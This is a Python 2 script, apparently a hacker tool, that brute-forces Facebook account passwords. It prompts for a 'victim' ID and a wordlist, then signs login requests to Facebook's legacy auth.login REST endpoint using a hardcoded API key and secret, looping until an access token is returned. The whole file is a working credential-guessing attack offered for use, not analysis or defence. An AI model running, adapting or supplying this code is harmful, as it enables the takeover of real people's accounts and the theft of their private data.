import urllib2
import hashlib
import requests
import json
import random
import sys
import os
os.system("clear")
class color:
	r = "\033[1;31m"
	g = "\033[1;32m"
	c = "\033[1;36m"
	b = "\033[1;34m"
print """

           #######################################
 	   #				         #
           # By : Mahmoud_Jony @bang.amen.184    #
           #					 #
	   #	     == @bang.amen.184==	         #
           #					 #
 	   #      [*] Egyption Hacker [*]        #
	   #					 #
           #######################################

"""
ID = raw_input("{}[{}*{}]{}Enter The Victim Id >> {} ".format(color.g, color.b, color.g, color.r, color.g))
passlist = raw_input("{}[{}*{}]{}Enter The Password Lsit Path >> {}".format(color.g, color.b, color.g, color.r, color.g))
os.system("clear")
print """

           #######################################
           #                                     #
           # By : Mahmoud_Jony @bang.amen.184       #
           #                                     #
           #                                     #
           #      [*] Egyption Hacker [*]        #
           #                                     #
           #######################################

"""
def get(data):
	try:
		sys.stdout.write("[*]Trying > {}".format(passwd))
                sys.stdout.flush()
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
		if a["access_token"]:
		    os.system("clear")
		    print color.r
		    print "[#] Password Attacked >>{} ".format(passwd)
		    sys.exit()
	except KeyError:
		print ""
	except KeyboardInterrupt:
		sys.exit()
def id(pswd):
        id = ID;pwd = pswd;API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig':x.hexdigest()})
        get(data)
opn = open(passlist, "r")
rd = opn.readlines()
for passwd in rd:
    id(passwd)
